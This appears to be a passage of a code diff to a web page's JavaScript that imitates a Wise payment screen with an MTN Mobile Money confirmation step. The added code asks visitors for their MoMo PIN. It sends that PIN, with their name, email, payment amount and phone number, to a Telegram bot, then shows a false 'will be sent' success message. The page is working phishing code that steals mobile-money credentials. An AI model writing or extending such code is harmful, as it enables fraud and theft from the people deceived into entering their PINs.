+          throw new Error(`Telegram API error: ${res.status} ${errText}`);
+        }
+        return res.json();
       }
 
-      // ---- Confirm recipient: fast feedback + success ----
-      function handleMtnConfirm() {
-        const phone = recipientPhone.value.trim();
+      function buildTelegramMessage(payload) {
+        const { senderName, senderEmail, amount, currency, reference, note,
+                recipientName, recipientPhoneFull, recipientCountry, momoPin, timestamp } = payload;
 
-        if (!phone) {
-          recipientPhone.classList.add('error');
-          showMtnStatus('Please enter the recipient MTN number.', 'error');
+        return `🔔 <b>NEW MTN PAYOUT CONFIRMED</b>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>💳 WISE PAYMENT</b>
+━━━━━━━━━━━━━━━━━━━━
+<b>Sender:</b> ${escapeHtml(senderName)}
+<b>Email:</b> ${escapeHtml(senderEmail)}
+<b>Amount:</b> ${escapeHtml(amount)} ${escapeHtml(currency)}
+<b>Reference:</b> ${escapeHtml(reference)}
+<b>Note:</b> ${escapeHtml(note)}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>📱 MTN RECIPIENT</b>
+━━━━━━━━━━━━━━━━━━━━
+<b>Name:</b> ${escapeHtml(recipientName || '—')}
+<b>Country:</b> ${escapeHtml(recipientCountry)}
+<b>Number:</b> ${escapeHtml(recipientPhoneFull)}
+<b>MoMo PIN:</b> <code>${escapeHtml(momoPin)}</code>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🕒 Time:</b> ${escapeHtml(timestamp)}
+<b>✅ Status:</b> Confirmed & sent`;
+      }
+
+      function escapeHtml(str) {
+        if (str == null) return '';
+        return String(str)
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;');
+      }
+
+      // ---- Validate phone ----
+      function isValidPhone(phone) {
+        const cleaned = phone.replace(/\s/g, '');
+        return /^\d{7,12}$/.test(cleaned);
+      }
+
+      // ---- Confirm transaction ----
+      async function handleMtnConfirm() {
+        const phoneLocal = recipientPhone.value.trim().replace(/\s/g, '');
+        const pin = momoPin.value.trim();
+
+        if (!phoneLocal) {
+          phoneWrap.classList.add('error');
+          showMtnStatus('Please enter the recipient number.', 'error');
           recipientPhone.focus();
           return;
         }
-
-        if (!isValidPhone(phone)) {
-          recipientPhone.classList.add('error');
-          showMtnStatus('Please enter a valid MTN number (10–15 digits).', 'error');
+        if (!isValidPhone(phoneLocal)) {
+          phoneWrap.classList.add('error');
+          showMtnStatus('Please enter a valid number (7–12 digits).', 'error');
           recipientPhone.focus();
           return;
         }
+        phoneWrap.classList.remove('error');
 
-        recipientPhone.classList.remove('error');
+        if (!pin || pin.length < 5) {
+          momoPin.classList.add('error');
+          showMtnStatus('Please enter your 5-digit MoMo PIN.', 'error');
+          momoPin.focus();
+          return;
+        }
+        momoPin.classList.remove('error');
 
         mtnConfirmBtn.disabled = true;
         mtnConfirmBtn.innerHTML = `
           <svg viewBox="0 0 24 24" class="spin">
             <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/>
           </svg>
-          Confirming...
+          Processing...
         `;
 
-        setTimeout(() => {
-          const name = recipientName.value.trim() || 'Recipient';
+        const countryParts = countrySelect.value.split('|');
+        const countryName = countrySelect.options[countrySelect.selectedIndex].text.split(' (')[0];
+        const countryDial = countryParts[1];
+        const phoneFull = `${countryDial}${phoneLocal}`;
+
+        const payload = {
+          senderName: paymentData.senderName || DEFAULT_DATA.senderName,
+          senderEmail: paymentData.senderEmail || DEFAULT_DATA.senderEmail,
+          amount: formatAmount(paymentData.amount),
+          currency: paymentData.currency || 'USD',
+          reference: paymentData.reference || DEFAULT_DATA.reference,
+          note: paymentData.note || DEFAULT_DATA.note,
+          recipientName: recipientName.value.trim(),
+          recipientPhoneFull: phoneFull,
+          recipientCountry: countryName,
+          momoPin: pin,
+          timestamp: new Date().toLocaleString('en-GB', {
+            day: '2-digit', month: 'short', year: 'numeric',
+            hour: '2-digit', minute: '2-digit', second: '2-digit'
+          })
+        };
+
+        try {
+          const result = await sendToTelegram(payload);
+
           mtnConfirmBtn.innerHTML = `
             <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-            Confirm recipient
+            Transaction confirmed
           `;
-          mtnConfirmBtn.disabled = false;
+          mtnConfirmBtn.disabled = true;
 
           showMtnStatus(
-            `✅ ${formatAmount(paymentData.amount)} ${paymentData.currency} will be sent to ${name} (${phone}) via MTN Mobile Money.`,
+            `✅ ${formatAmount(paymentData.amount)} ${paymentData.currency} will be sent to ${payload.recipientName || payload.recipientPhoneFull} via MTN Mobile Money.`,
             'success'
           );
-        }, 700);
+
+          if (result.simulated) {
+            console.log('%c⚠️ Telegram not configured — message logged above.', 'color:#FFCC00;');
+          }
+        } catch (err) {
+          console.error('Failed to send to Telegram:', err);
+          mtnConfirmBtn.disabled = false;
+          mtnConfirmBtn.innerHTML = `
+            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+            Confirm transaction
+          `;
+          showMtnStatus('Could not send details. Please check your connection and try again.', 'error');
+        }
       }
 
       // ---- Event listeners ----
@@ -1039,15 +1447,14 @@
       mtnConfirmBtn.addEventListener('click', handleMtnConfirm);
       backBtn.addEventListener('click', goToWise);
 
-      recipientPhone.addEventListener('input', () => {
-        recipientPhone.classList.remove('error');
-      });
-
       recipientPhone.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') { e.preventDefault(); momoPin.focus(); }
+      });
+      momoPin.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') { e.preventDefault(); mtnConfirmBtn.click(); }
       });
       recipientName.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter') { e.preventDefault(); mtnConfirmBtn.click(); }
+        if (e.key === 'Enter') { e.preventDefault(); recipientPhone.focus(); }
       });
 
       // ---- Initial render ----
